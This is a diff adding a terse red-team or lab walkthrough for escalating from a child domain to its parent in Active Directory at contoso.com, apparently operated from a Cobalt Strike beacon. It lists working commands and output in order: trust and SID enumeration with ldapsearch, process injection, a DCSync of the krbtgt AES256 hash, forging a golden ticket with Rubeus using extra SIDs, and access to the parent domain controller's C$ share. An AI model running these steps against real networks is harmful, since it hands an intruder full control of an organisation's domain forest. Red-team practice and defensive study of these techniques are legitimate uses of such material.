@@ -1,0 +1,36 @@
+we have SYSTEM shell on dublin.contoso.com
+let's enumerate the trust:
+    beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+    we see trust direction 3, which is TRUST_DIRECTION_BIDIRECTIONAL
+    we see trust attribute 32, which is TRUST_ATTRIBUTE_WITHIN_FOREST
+
+now let's grab our SID
+    beacon> ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
+    objectSid: S-1-5-21-690277740-3036021016-2883941857
+
+now let's grab the SID for parent's domain Enterprise Admins group
+    beacon> ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
+    objectSid: S-1-5-21-3926355307-1661546229-813047887-519
+
+let's impersonate the DUBLIN\sguest user
+    find process running as that user
+    Inject > tcp
+
+now let's grab the child domain's krbtgt aes256 hash
+    beacon> dcsync dublin.contoso.com DUBLIN\krbtgt
+    * Primary:Kerberos-Newer-Keys *
+    Default Salt : DUBLIN.CONTOSO.COMkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
+    
+now lets forge a golden ticket
+    C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
+    [*] Ticket written to C:\Users\Attacker\Desktop\golden_2026_04_23_20_18_38_Administrator_to_krbtgt@DUBLIN.CONTOSO.COM
+
+now inject the ticket into SYSTEM beacon session
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\golden_2026_04_23_20_18_38_Administrator_to_krbtgt@DUBLIN.CONTOSO.COM
+
+verify
+    beacon> run klist
+    beacon> ls \\lon-dc-1\c$
